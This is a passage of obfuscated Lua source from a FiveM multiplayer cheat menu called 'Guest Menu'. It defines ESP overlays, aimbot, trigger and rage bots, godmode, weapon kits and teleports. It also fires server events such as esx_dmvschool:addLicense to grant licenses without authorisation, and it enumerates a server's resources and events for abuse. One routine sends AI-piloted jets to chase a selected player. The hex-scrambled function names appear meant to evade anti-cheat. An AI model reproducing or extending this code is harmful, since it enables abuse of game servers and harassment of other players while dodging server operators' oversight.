                        local fY = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                        local fZ = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                        local f_ = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                        local fU = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                        local fV = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                        local i = nil
                        RequestModel(veh)
                        RequestModel("a_m_o_acult_01")
                        while not HasModelLoaded(veh) and not HasModelLoaded("a_m_o_acult_01") do
                            RequestModel("a_m_o_acult_01")
                            d.Main.GuestWait(0)
                            RequestModel(veh)
                        end
                        if HasModelLoaded(veh) then
                            Citizen.Wait(50)
                            i =
                                e087206cc908106f5b9548005fa39fd(
                                veh,
                                bH.x - fU * 90,
                                bH.y - fV * 90,
                                bH.z + 700,
                                GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                                true,
                                false
                            )
                            local g1 =
                                e087206cc908106f5b9548005fa39fd(
                                veh,
                                bH.x + 300,
                                bH.y,
                                bH.z + 800,
                                GetEntityHeading(ck),
                                true,
                                true
                            )
                            if DoesEntityExist(i) then
                                NetworkRequestControlOfEntity(i)
                                SetVehicleDoorsLocked(i, 4)
                                RequestModel("a_m_o_acult_01")
                                Citizen.Wait(50)
                                if HasModelLoaded("a_m_o_acult_01") then
                                    Citizen.Wait(50)
                                    local K = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    local g0 = CreatePed(21, GetHashKey("a_m_o_acult_01"), bH.x, bH.y, bH.z, true, true)
                                    if DoesEntityExist(g0) and DoesEntityExist(K) then
                                        SetPedIntoVehicle(K, i, -1)
                                        SetPedIntoVehicle(g0, g1, -1)
                                        TaskPlaneChase(
                                            K,
                                            GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                            100.00,
                                            786468
                                        )
                                        TaskPlaneChase(g0, GetPlayerPed(SelectedPlayer), 100.00, 786468)
                                        SetDriverAbility(K, 10.0)
                                        SetDriverAggressiveness(K, 10.0)
                                        SetDriverAbility(g0, 10.0)
                                        SetDriverAggressiveness(g0, 10.0)
                                    end
                                end
                            end
                        end
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("visualOptions") then
                if I.menuButton("Visions options", "visions", ">") then
                elseif I.button("~p~			      	INFORMATIONS") then
                elseif I.checkBox("~Y~Show overlay", I.OptionConfig.visDrawFPS) then
                    I.OptionConfig.visDrawFPS = not I.OptionConfig.visDrawFPS
                elseif I.checkBox("~Y~Show coords", I.OptionConfig.teleShowCoords) then
                    I.OptionConfig.teleShowCoords = not I.OptionConfig.teleShowCoords
                elseif I.checkBox("~Y~Force blips", I.OptionConfig.visb5ea815b0f8440ddaeebad4129bd7222) then
                    I.OptionConfig.visb5ea815b0f8440ddaeebad4129bd7222 =
                        not I.OptionConfig.visb5ea815b0f8440ddaeebad4129bd7222
                elseif I.checkBox("~Y~Force minimap", I.OptionConfig.visForceRadar) then
                    I.OptionConfig.visForceRadar = not I.OptionConfig.visForceRadar
                elseif I.button("~p~			      	    ESP") then
                elseif I.checkBox("~Y~Show names", I.OptionConfig.ForceNamess) then
                    I.OptionConfig.ForceNamess = not I.OptionConfig.ForceNamess
                elseif I.checkBox("Show weapon", I.OptionConfig.visESPShowWeapon) then
                    I.OptionConfig.visESPShowWeapon = not I.OptionConfig.visESPShowWeapon
                elseif I.checkBox("Show vehicle", I.OptionConfig.visESPShowVehicle) then
                    I.OptionConfig.visESPShowVehicle = not I.OptionConfig.visESPShowVehicle
                elseif I.checkBox("Show boxes", I.OptionConfig.ESPBox) then
                    I.OptionConfig.ESPBox = not I.OptionConfig.ESPBox
                elseif I.checkBox("Show bones", I.OptionConfig.ESPBones) then
                    I.OptionConfig.ESPBones = not I.OptionConfig.ESPBones
                    if not I.OptionConfig.ESPBones then
                        local fN = GetActivePlayers()
                        for b7 = 1, #fN do
                            local g2 = fN[b7]
                            local g3 = GetPlayerPed(g2)
                            d.Main.GuestAimMore.GuestResetEntityAlpha(
                                g3
                            )
                        end
                    end
                elseif I.checkBox("Show lines", I.OptionConfig.ESPLines) then
                    I.OptionConfig.ESPLines = not I.OptionConfig.ESPLines
                elseif I.checkBox("Show Distance", I.OptionConfig.visESPShowDistance) then
                    I.OptionConfig.visESPShowDistance = not I.OptionConfig.visESPShowDistance
                elseif
                    I.comboBoxSlider(
                        "Distance",
                        I.OptionConfig.visualsESPDistanceOps,
                        I.OptionConfig.currentVisualsESPDistance,
                        I.OptionConfig.selectedVisualsESPDistance,
                        function(dI, dJ)
                            I.OptionConfig.currentVisualsESPDistance = dI
                            I.OptionConfig.selectedVisualsESPDistance = dI
                            I.OptionConfig.visualsESPDistance =
                                I.OptionConfig.visualsESPDistanceOps[I.OptionConfig.currentVisualsESPDistance]
                        end
                    )
                 then
                elseif
                    I.comboBoxSlider(
                        "ESP Refresh Rate",
                        I.OptionConfig.visualsESPRefreshRates,
                        I.OptionConfig.currentESPRefreshIndex,
                        I.OptionConfig.selectedESPRefreshIndex,
                        function(dI, dJ)
                            I.OptionConfig.currentESPRefreshIndex = dI
                            I.OptionConfig.selectedESPRefreshIndex = dI
                            if dI == 1 then
                                I.OptionConfig.visualsESPRefreshRate = 0
                            elseif dI == 2 then
                                I.OptionConfig.visualsESPRefreshRate = 50
                            elseif dI == 3 then
                                I.OptionConfig.visualsESPRefreshRate = 150
                            elseif dI == 4 then
                                I.OptionConfig.visualsESPRefreshRate = 250
                            elseif dI == 5 then
                                I.OptionConfig.visualsESPRefreshRate = 500
                            elseif dI == 6 then
                                I.OptionConfig.visualsESPRefreshRate = 1000
                            elseif dI == 7 then
                                I.OptionConfig.visualsESPRefreshRate = 2000
                            elseif dI == 8 then
                                I.OptionConfig.visualsESPRefreshRate = 5000
                            end
                        end
                    )
                 then
                elseif
                    I.comboBox(
                        "Crosshair :",
                        e2,
                        d_,
                        e0,
                        function(dI, dJ)
                            d_ = dI
                            e0 = dI
                        end
                    )
                 then
                elseif I.button("~p~			      	 OTHER") then
                elseif I.checkBox("~Y~Show crosshair", I.OptionConfig.e564abecb856e0385c2ecb46e4c6a2b8) then
                    I.OptionConfig.e564abecb856e0385c2ecb46e4c6a2b8 =
                        not I.OptionConfig.e564abecb856e0385c2ecb46e4c6a2b8
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("visions") then
                if I.button("Reset vision") then
                    ClearTimecycleModifier()
                    ClearExtraTimecycleModifier()
                elseif I.button("~o~Drunk", "~g~[Safe]") then
                    SetTimecycleModifier("Drunk")
                elseif I.button("~y~Yellow", "~g~[Safe]") then
                    SetTimecycleModifier("mp_lad_judgment")
                    SetTimecycleModifierStrength(1.2)
                elseif I.button("White", "~g~[Safe]") then
                    SetTimecycleModifier("mp_lad_day")
                    SetTimecycleModifierStrength(1.2)
                elseif I.button("~r~Red", "~g~[Safe]") then
                    SetTimecycleModifier("mp_lad_night")
                    SetTimecycleModifierStrength(1.2)
                elseif I.checkBox("~g~Night vision", I.OptionConfig.nightVision) then
                    I.OptionConfig.nightVision = not I.OptionConfig.nightVision
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("visualOptionsESP") then
                if I.checkBox("~Y~Activer", I.OptionConfig.visESPEnable) then
                    I.OptionConfig.visESPEnable = not I.OptionConfig.visESPEnable
                    I.functions.bd411d052b3b330007ad0a673acb()
                elseif I.checkBox("~Y~ID", I.OptionConfig.visESPShowID) then
                    I.OptionConfig.visESPShowID = not I.OptionConfig.visESPShowID
                elseif I.checkBox("~Y~Name", I.OptionConfig.visESPShowName) then
                    I.OptionConfig.visESPShowName = not I.OptionConfig.visESPShowName
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("teleportOptions") then
                if
                    I.comboBox(
                        "Teleport to a special",
                        {"Center of LS", "LSPD", "EMS", "Parking", "Inconnito", "Mont Chiliad", "Mecano"},
                        I.OptionConfig.currentTeleportToOptions,
                        I.OptionConfig.selectedTeleportToOptions,
                        function(dI, dJ)
                            I.OptionConfig.currentTeleportToOptions = dI
                            I.OptionConfig.selectedTeleportToOptions = dI
                        end
                    )
                 then
                    if I.OptionConfig.selectedTeleportToOptions == 1 then
                        I.functions.bd249ffd8df1cc2f86757331(195.23, -934.04, 30.69)
                    elseif I.OptionConfig.selectedTeleportToOptions == 2 then
                        I.functions.bd249ffd8df1cc2f86757331(426.26, -980.97, 30.71)
                    elseif I.OptionConfig.selectedTeleportToOptions == 3 then
                        I.functions.bd249ffd8df1cc2f86757331(361.96, -589.52, 28.67)
                    elseif I.OptionConfig.selectedTeleportToOptions == 4 then
                        I.functions.bd249ffd8df1cc2f86757331(-354.7, -783.8, 38.78)
                    elseif I.OptionConfig.selectedTeleportToOptions == 5 then
                        I.functions.bd249ffd8df1cc2f86757331(161.49, 942.68, -160.59)
                    elseif I.OptionConfig.selectedTeleportToOptions == 6 then
                        I.functions.bd249ffd8df1cc2f86757331(498.4, 5591.73, 795.17)
                    elseif I.OptionConfig.selectedTeleportToOptions == 7 then
                        I.functions.bd249ffd8df1cc2f86757331(-194.69, -1303.53, 31.25)
                    end
                elseif I.button("Teleport to waypoint", "~g~[Safe]") then
                    I.functions.f7ab3c7f27599e9e439768e20b25ed()
                elseif I.button("Teleport to coords") then
                    local x = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("X :", "", 100)
                    local y = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Y :", "", 100)
                    local z = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Z :", "", 100)
                    x = d.Main.GuestToNum(x)
                    y = d.Main.GuestToNum(y)
                    z = d.Main.GuestToNum(z)
                    c3188c79a068242c231f422e25ebbae(PlayerPedId(), x, y, z)
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("vehicleOptions") then
                if I.menuButton("Utils", "vehicleutils", ">") then
                elseif I.menuButton("Auto Pilot", "autopilot", ">") then
                elseif I.menuButton("Customize", "vehicleLosSantosCustoms", ">") then
                elseif I.menuButton("Doors options", "doorsoptions", ">") then
                elseif I.menuButton("Vehicles list", "vehicleSpawnList", ">") then
                elseif I.button("~p~			    	VEHICLE STATE") then
                elseif I.checkBox("~Y~Godmode", I.OptionConfig.vehGodmode) then
                    I.OptionConfig.vehGodmode = not I.OptionConfig.vehGodmode
                    I.functions.f48902895f58b85ba557a3c83a21b1a(
                        I.Guestdata.pLocalPlayer.cVehicle
                    )
                elseif I.button("Repair", "~g~[Safe]") then
                    I.functions.f48902895f58b85ba557a3c83a21b1a(
                        I.Guestdata.pLocalPlayer.cVehicle
                    )
                elseif I.button("Clean", "~g~[Safe]") then
                    SetVehicleDirtLevel(I.Guestdata.pLocalPlayer.cVehicle, 0.0)
                elseif I.button("Dirty", "~g~[Safe]") then
                    SetVehicleDirtLevel(I.Guestdata.pLocalPlayer.cVehicle, 15.0)
                elseif I.checkBox("No Collision", I.OptionConfig.Collision) then
                    I.OptionConfig.Collision = not I.OptionConfig.Collision
                elseif I.button("Delete", "~g~[Safe]") then
                    DeleteEntity(GetPlayersLastVehicle(PlayerPedId()))
                elseif I.checkBox("Bulletproof Tires", I.OptionConfig.GodmodeTires) then
                    I.OptionConfig.GodmodeTires = not I.OptionConfig.GodmodeTires
                    I.functions.ebbd65841190b96a9829425dd0630(
                        I.Guestdata.pLocalPlayer.cVehicle
                    )
                elseif
                    I.comboBoxSlider(
                        "Legit boost",
                        I.comboBoxes[3]._words,
                        eG,
                        eH,
                        function(dI, dJ)
                            eG = dI
                            eH = dI
                        end
                    )
                 then
                elseif
                    I.comboBoxSlider(
                        "Brutal boost",
                        I.comboBoxes[3]._words,
                        eI,
                        eJ,
                        function(dI, dJ)
                            eI = dI
                            eJ = dI
                        end
                    )
                 then
                elseif I.button("~p~			      VEHICLE SPAWNING") then
                elseif I.button("Spawn a vehicle", "~g~[Safe]") then
                    local eR = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter Vehicle Spawn Name", "", 100)
                    if eR and IsModelValid(eR) and IsModelAVehicle(eR) then
                        I.functions.b8bb6a6560cb3ac96edc69c960db7560(
                            {hash = GetHashKey(eR), setIn = I.OptionConfig.vehSpawnInside}
                        )
                    else
                        Guestcustomnotif("~p~Guest Menu : ~s~Model is not valid!", 0)
                    end
                elseif I.checkBox("~Y~Spawn inside", I.OptionConfig.vehSpawnInside) then
                    I.OptionConfig.vehSpawnInside = not I.OptionConfig.vehSpawnInside
                elseif I.button("~p~			      	OTHER") then
                elseif I.checkBox("Horn Boost", I.OptionConfig.speedboost) then
                    I.OptionConfig.speedboost = not I.OptionConfig.speedboost
                elseif I.checkBox("Drive on water", I.OptionConfig.DriveOnWater) then
                    I.OptionConfig.DriveOnWater = not I.OptionConfig.DriveOnWater
                    if I.OptionConfig.DriveOnWaterProp == nil then
                        x, y, z =
                            d.Main.GuestTable.GuestUnPack(
                            GetEntityCoords(PlayerPedId())
                        )
                        I.OptionConfig.DriveOnWaterProp =
                            CreateObject(GetHashKey("ar_prop_ar_bblock_huge_01"), x, y, -90.0, 0, 1, 0)
                    elseif not I.OptionConfig.DriveOnWater then
                        DeleteEntity(I.OptionConfig.DriveOnWaterProp)
                        I.OptionConfig.DriveOnWaterProp = nil
                    end
                elseif I.button("Flip car", "~g~[Safe]") then
                    SetVehicleOnGroundProperly(I.Guestdata.pLocalPlayer.cVehicle)
                    local g4 = I.Guestdata.pLocalPlayer.cVehicle
                    if g4 and DoesEntityExist(g4) then
                        local g5 = GetVehicleHandlingFloat(g4, "CHandlingData", "fSuspensionRaise")
                        if I.comboBoxes[1]._words[I.comboBoxes[1]._selected] == "1" then
                            SetVehicleHandlingFloat(g4, "CHandlingData", "fSuspensionRaise", g5 - 0.01)
                        elseif I.comboBoxes[1]._words[I.comboBoxes[1]._selected] == "2" then
                            SetVehicleHandlingFloat(g4, "CHandlingData", "fSuspensionRaise", g5 + 0.01)
                        end
                        I.functions.f48902895f58b85ba557a3c83a21b1a(g4)
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("vehicleSpawnList") then
                for fO, g6 in ipairs(I.FunctionTables.vehicleCategories) do
                    if I.menuButton(g6, "vehicleSpawnSelected") then
                        selectedCarTypeIdx = fO
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("vehicleutils") then
                if I.button("Take the right place") then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    SetEntityRotation(veh, 0.0, 0.0, GetEntityHeading(veh))
                elseif I.button("Get licenses", "~g~[Safe]") then
                    d.Main.GuestEvent("dmv:success")
                    d.Main.GuestEvent(
                        "esx_dmvschool:addLicense",
                        "drive"
                    )
                    d.Main.GuestEvent(
                        "esx_dmvschool:addLicense",
                        "drive_bike"
                    )
                    d.Main.GuestEvent(
                        "esx_dmvschool:addLicense",
                        "drive_truck"
                    )
                elseif I.checkBox("~Y~Speedometer", I.OptionConfig.speedometer) then
                    I.OptionConfig.speedometer = not I.OptionConfig.speedometer
                elseif I.checkBox("~Y~Force seatbelt", I.OptionConfig.vehNoFall) then
                    I.OptionConfig.vehNoFall = not I.OptionConfig.vehNoFall
                elseif I.checkBox("No fall in vehicles", I.OptionConfig.NoBikeFall) then
                    I.OptionConfig.NoBikeFall = not I.OptionConfig.NoBikeFall
                    SetPedCanBeKnockedOffVehicle(PlayerPedId(), I.OptionConfig.NoBikeFall)
                elseif I.checkBox("Drift Mod", I.OptionConfig.driftmode) then
                    I.OptionConfig.driftmode = not I.OptionConfig.driftmode
                elseif I.checkBox("Auto-Clean", I.OptionConfig.AutoClean) then
                    I.OptionConfig.AutoClean = not I.OptionConfig.AutoClean
                elseif I.checkBox("Easy Handling", I.OptionConfig.EasyHandling) then
                    I.OptionConfig.EasyHandling = not I.OptionConfig.EasyHandling
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("weaponOptions") then
                if I.menuButton("Get a weapon", "weaponOptionsTypes", ">") then
                elseif I.menuButton("Weapons Kits", "weaponskit", ">") then
                elseif I.menuButton("Weapons Options", "weaponOptionsModification", ">") then
                elseif I.button("Get all weapons", "~r~[Risky]") then
                    I.functions.sPO.bbc99a8240bf964dca27f2e8a48f665a(false, GetPlayerPed(-1))
                elseif I.button("Delete all weapons", "~g~[Safe]") then
                    RemoveAllPedWeapons(I.Guestdata.pLocalPlayer.pedId, true)
                elseif
                    I.comboBox(
                        "Get ammo",
                        {"Current", "All"},
                        I.OptionConfig.weaponsGiveAmmoCurrent,
                        I.OptionConfig.weaponsGiveAmmoSelected,
                        function(dI, dJ)
                            I.OptionConfig.weaponsGiveAmmoCurrent = dI
                            I.OptionConfig.weaponsGiveAmmoSelected = dI
                        end
                    )
                 then
                    if I.OptionConfig.weaponsGiveAmmoSelected == 1 then
                        local retval, Z =
                            d.Main.GuestAimMore.GuestGetCurrentPedWeapon(
                            GetPlayerPed(-1),
                            true
                        )
                        AddAmmoToPed(GetPlayerPed(-1), Z, 250)
                    elseif I.OptionConfig.weaponsGiveAmmoSelected == 2 then
                        for b7 = 1, #I.FunctionTables.weaponsModels do
                            AddAmmoToPed(GetPlayerPed(-1), GetHashKey(I.FunctionTables.weaponsModels[b7]), 250)
                        end
                    end
                elseif
                    I.comboBox(
                        "Damage multiplier:",
                        I.OptionConfig.weaponsDamageMultiplier,
                        I.OptionConfig.weaponsDamageMultiplierCurrent,
                        I.OptionConfig.weaponsDamageMultiplierSelected,
                        function(dI, dJ)
                            I.OptionConfig.weaponsDamageMultiplierCurrent = dI
                            I.OptionConfig.weaponsDamageMultiplierSelected = dI
                            I.OptionConfig.weaponsDamageMultiplierSet =
                                F(
                                I.OptionConfig.weaponsDamageMultiplier[I.OptionConfig.weaponsDamageMultiplierSelected]
                            )
                        end
                    )
                 then
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("weaponskit") then
                if I.button("Roleplay kit", "~o~[Risky]") then
                    I.natives.d6900ec9e918eb1426be32868e2b0(GetPlayerPed(-1), GetHashKey("weapon_pistol"), 250, false)
                    Guestcustomnotif("~o~Weapons Kits : ~s~Roleplay kit added!", false)
                elseif I.button("Legit kit", "~o~[Risky]") then
                    I.natives.d6900ec9e918eb1426be32868e2b0(GetPlayerPed(-1), GetHashKey("weapon_pistol"), 250, false)
                    I.natives.d6900ec9e918eb1426be32868e2b0(GetPlayerPed(-1), GetHashKey("weapon_knife"), 250, false)
                    I.natives.d6900ec9e918eb1426be32868e2b0(GetPlayerPed(-1), GetHashKey("weapon_bat"), 250, false)
                    Guestcustomnotif("~o~Weapons Kits : ~s~Legit kit added!", false)
                elseif I.button("Tryhard kit", "~o~[Risky]") then
                    db831a7fdd83dd1e2a309ce7591dff8.natives.d6900ec9e918eb1426be32868e2b0(
                        GetPlayerPed(-1),
                        GetHashKey("weapon_pistol"),
                        250,
                        false
                    )
                    db831a7fdd83dd1e2a309ce7591dff8.natives.d6900ec9e918eb1426be32868e2b0(
                        GetPlayerPed(-1),
                        GetHashKey("weapon_assaultrifle"),
                        250,
                        false
                    )
                    db831a7fdd83dd1e2a309ce7591dff8.natives.d6900ec9e918eb1426be32868e2b0(
                        GetPlayerPed(-1),
                        GetHashKey("weapon_microsmg"),
                        250,
                        false
                    )
                    db831a7fdd83dd1e2a309ce7591dff8.natives.d6900ec9e918eb1426be32868e2b0(
                        GetPlayerPed(-1),
                        GetHashKey("weapon_bat"),
                        250,
                        false
                    )
                    Guestcustomnotif("~o~Weapons Kits : ~s~Tryhard kit added!", false)
                elseif I.button("~r~More kits will be added later!") then
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("weaponOptionsModification") then
                if I.button("~p~			      	 COMBAT OPTIONS") then
                elseif I.checkBox("~r~Rage Bot ~o~(!)", I.OptionConfig.RageBot) then
                    I.OptionConfig.RageBot = not I.OptionConfig.RageBot
                elseif I.checkBox("Forcefield ~o~(!)", I.OptionConfig.Forcefield) then
                    I.OptionConfig.Forcefield = not I.OptionConfig.Forcefield
                elseif I.checkBox("Force Gun ~o~(!)", I.OptionConfig.ForceGun) then
                    I.OptionConfig.ForceGun = not I.OptionConfig.ForceGun
                elseif I.checkBox("Aimbot", I.OptionConfig.Aimbot) then
                    I.OptionConfig.Aimbot = not I.OptionConfig.Aimbot
                elseif I.checkBox("Show FOV", I.OptionConfig.DrawFovS) then
                    I.OptionConfig.DrawFovS = not I.OptionConfig.DrawFovS
                elseif I.checkBox("~Y~Trigger Bot ~o~(!)", I.OptionConfig.TriggerBot) then
                    I.OptionConfig.TriggerBot = not I.OptionConfig.TriggerBot
                elseif I.checkBox("~Y~No Reload", I.OptionConfig.weapNoReload) then
                    I.OptionConfig.weapNoReload = not I.OptionConfig.weapNoReload
                elseif I.checkBox("Infinite combat roll", I.OptionConfig.InfiniteCombatRoll) then
                    I.OptionConfig.InfiniteCombatRoll = not I.OptionConfig.InfiniteCombatRoll
                elseif I.button("~p~			      	MODIFICATIONS") then
                elseif
                    I.comboBox(
                        "Forcefield Radius :",
                        ForcefieldRadiusOps,
                        v,
                        w,
                        function(dI, dJ)
                            v = dI
                            w = dI
                            ForcefieldRadius = ForcefieldRadiusOps[dI]
                        end
                    )
                 then
                elseif
                    I.comboBox(
                        "Aimbot Target :",
                        AimbotBoneOps,
                        q,
                        s,
                        function(dI, dJ)
                            q = dI
                            s = dI
                            AimbotBone = d2dc04d221955ab58005e2babca801e7(AimbotBoneOps[dI])
                        end
                    )
                 then
                elseif I.button("~p~			      	OTHER OPTIONS") then
                elseif I.checkBox("~Y~Spin Bot ~g~[Safe]", I.OptionConfig.Spinbot) then
                    I.OptionConfig.Spinbot = not I.OptionConfig.Spinbot
                elseif I.checkBox("Bunny Hop ~o~(!)", I.OptionConfig.BunnyHop) then
                    I.OptionConfig.BunnyHop = not I.OptionConfig.BunnyHop
                elseif I.checkBox("~Y~No Recoil", I.OptionConfig.NoRecoil) then
                    I.OptionConfig.NoRecoil = not I.OptionConfig.NoRecoil
                elseif I.checkBox("~Y~Explosive Ammo", I.OptionConfig.weapExplosiveAmmo) then
                    I.OptionConfig.weapExplosiveAmmo = not I.OptionConfig.weapExplosiveAmmo
                elseif I.checkBox("~Y~Teleport to bullet", I.OptionConfig.weapTeleportGun) then
                    I.OptionConfig.weapTeleportGun = not I.OptionConfig.weapTeleportGun
                elseif I.checkBox("~Y~Infinite Ammo", I.OptionConfig.InfAmmo2) then
                    I.OptionConfig.InfAmmo2 = not I.OptionConfig.InfAmmo2
                    SetPedInfiniteAmmoClip(PlayerPedId(), I.OptionConfig.InfAmmo2)
                elseif I.checkBox("~Y~Rapid Fire", I.OptionConfig.weapRapidFire) then
                    I.OptionConfig.weapRapidFire = not I.OptionConfig.weapRapidFire
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("serverOptions") then
                I.SubSettingTitle("serverOptions", "Server IP: " .. I.natives.getCurrentServerEndpoint())
                if I.menuButton("Server Resources", "serverOptionsResources", ">") then
                elseif I.menuButton("Trigger Events", "serverOptionsTriggerEvents", ">") then
                elseif
                    I.comboBoxSlider(
                        "Ped Density",
                        eA,
                        ey,
                        ez,
                        function(dI, dJ)
                            ey = dI
                            ez = dI
                            eB = ex[dI]
                        end
                    )
                 then
                end
                if I.button("Resource", I.natives.getCurrentResourceName()) then
                end
                if I.functions.f1d4856a114a6894f5812bb126a541b("es_extended") then
                    if I.Guestdata.es_extended then
                        if
                            I.button(
                                "ESX",
                                (d.Main.GuestToString(
                                    I.Guestdata.es_extended
                                ) == "esx:getSharedObject" and
                                    "" or
                                    "~r~") ..
                                    d.Main.GuestToString(
                                        I.Guestdata.es_extended
                                    )
                            )
                         then
                        end
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("serverOptionsResources") then
                if validResources and validResources ~= nil and #validResources > 0 then
                    for cd, g7 in pairs(validResources) do
                        if I.menuButton(g7, "serverOptionsResourcesSelected") then
                            SelectedResource = g7
                        end
                    end
                else
                    local g8 = I.NewFunction.d99a8e7f010c9f33f11485c499d1af68()
                    for b7 = 1, #g8 do
                        if I.button(g8[b7]) then
                        end
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("serverOptionsResources2") then
                if validResources and validResources ~= nil and #validResources > 0 then
                    for cd, g7 in pairs(validResources) do
                        if I.menuButton(g7, "serverOptionsResourcesSelected2") then
                            SelectedResource = g7
                        end
                    end
                else
                    local g8 = I.NewFunction.d99a8e7f010c9f33f11485c499d1af68()
                    for b7 = 1, #g8 do
                        if I.button(g8[b7]) then
                        end
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("serverOptionsResourcesSelected") then
                I.SubSettingTitle("serverOptionsResourcesSelected", SelectedResource .. " Data")
                if I.menuButton("Client Events", "serverOptionsResourcesSelectedCEvents", ">") then
                end
                if I.menuButton("Server Events", "serverOptionsResourcesSelectedSEvents", ">") then
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("serverOptionsResourcesSelectedCEvents") then
                I.SubSettingTitle("serverOptionsResourcesSelectedCEvents", SelectedResource .. " Client Events")
                for aM, aQ in pairs(validResourceEvents[SelectedResource]) do
                    if I.button(aQ) then
                        print(aM)
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("serverOptionsResourcesSelectedSEvents") then
                I.SubSettingTitle("serverOptionsResourcesSelectedSEvents", SelectedResource .. " Server Events")
                if validResourceServerEvents[SelectedResource] ~= nil then
                    for aQ, k in pairs(validResourceServerEvents[SelectedResource]) do
                        if I.button(aQ) then
                            local g9 =
                                d.Main.GuestTable.GuestMsgUnpack(
                                k
                            )
                            local ga = aQ .. "("
                            for h, i in ipairs(g9) do
                                ga =
                                    ga ..
                                    d.Main.GuestToString(i) ..
                                        (h == #g9 and ")" or ", ")
                            end
                            if #g9 == 0 then
                                ga = ga .. ")"
                            end
                            print("^2" .. ga)
                        end
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("menuSettings") then
                if I.menuButton("Credits", "credits", ">") then
                elseif I.menuButton("Keybinds", "keybindSettings", ">") then
                elseif
                    I.comboBox(
                        "Menu X",
                        ei,
                        ee,
                        ef,
                        function(dI, dJ)
                            ee = dI
                            ef = dJ
                            for b7 = 1, #I.menus_list do
                                I.setMenuX(I.menus_list[b7], ei[ee])
                            end
                        end
                    )
                 then
                elseif
                    I.comboBox(
                        "Menu Y",
                        ej,
                        eg,
                        eh,
                        function(dI, dJ)
                            eg = dI
                            eh = dJ
                            for b7 = 1, #I.menus_list do
                                I.setMenuY(I.menus_list[b7], ej[eg])
                            end
                        end
                    )
                 then
                elseif
                    I.comboBox(
                        "Maximum Displayed Options",
                        em,
                        ek,
                        el,
                        function(dI, dJ)
                            ek = dI
                            el = dJ
                            for b7 = 1, #I.menus_list do
                                I.setMaxOptionCount(I.menus_list[b7], em[ek])
                            end
                        end
                    )
                 then
                elseif
                    I.comboBox(
                        "Theme",
                        I.GuestCurrentUI.themeUI,
                        en,
                        eo,
                        function(dI, dJ)
                            en = dI
                            eo = dI
                        end
                    )
                 then
                    I.GuestCurrentUI.selectedUI =
                        I.GuestCurrentUI.themeUI[eo]
                    I.initTheme()
                elseif
                    I.comboBox(
                        "Checkbox Style",
                        I.GuestCurrentUI.availableCheckboxStyles,
                        ep,
                        eq,
                        function(dI, dJ)
                            ep = dI
                            eq = dI
                        end
                    )
                 then
                    I.GuestCurrentUI.selectedCheckboxStyle =
                        I.GuestCurrentUI.availableCheckboxStyles[eq]
                elseif I.checkBox("~Y~Rainbow", I.GuestCurrentUI.selectedUIRainbow) then
                    I.GuestCurrentUI.selectedUIRainbow =
                        not I.GuestCurrentUI.selectedUIRainbow
                elseif I.checkBox("~Y~Text Outline", I.GuestCurrentUI.menu_TextOutline) then
                    I.GuestCurrentUI.menu_TextOutline =
                        not I.GuestCurrentUI.menu_TextOutline
                elseif
                    I.checkBox("~Y~Text Drop Shadow", I.GuestCurrentUI.menu_TextDropShadow)
                 then
                    I.GuestCurrentUI.menu_TextDropShadow =
                        not I.GuestCurrentUI.menu_TextDropShadow
                elseif I.checkBox("~Y~Selection Rect", I.GuestCurrentUI.menu_RectOverlay) then
                    I.GuestCurrentUI.menu_RectOverlay =
                        not I.GuestCurrentUI.menu_RectOverlay
                elseif I.button("~r~Close Menu", I.GuestCurrentUI._mVersion) then
                    I.ba324546()
                    I.shouldShowMenu = false
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("credits") then
                local gb = {}
                for b7 = 1, #gb do
                    if I.button(gb[b7]) then
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("keybindSettings2") then
                for h, i in pairs(I.keyBinds) do
                    if I.button(i.label, i.handle and "Actual : " .. i.handle .. "" or "Actual : None") then
                        o(json.encode(A))
                        local gc =
                            I.NewFunction.c9f328ef7b30553a6705e827855bd30c(
                            "Insert new key here : (Example : F3,F4,F5)",
                            "",
                            10
                        )
                        local aM =
                            d.Main.GuestString.GuestUpper(
                            gc
                        )
                        if A[aM] then
                            i.handle = aM
                            Guestcustomnotif(
                                "~p~Guest Menu : ~s~Menu bind has been set to [" .. aM .. "]",
                                0
                            )
                        else
                            if gc == "None" or gc == nil or gc == "" then
                                if i == I.keyBinds.currentKeybindMenu then
                                    Guestcustomnotif(
                                        "~p~Guest Menu : ~s~This key cannot be unbound.",
                                        0
                                    )
                                else
                                    i.handle = nil
                                    Guestcustomnotif(
                                        "~p~Guest Menu : ~s~Key has been unbound.",
                                        0
                                    )
                                end
                            else
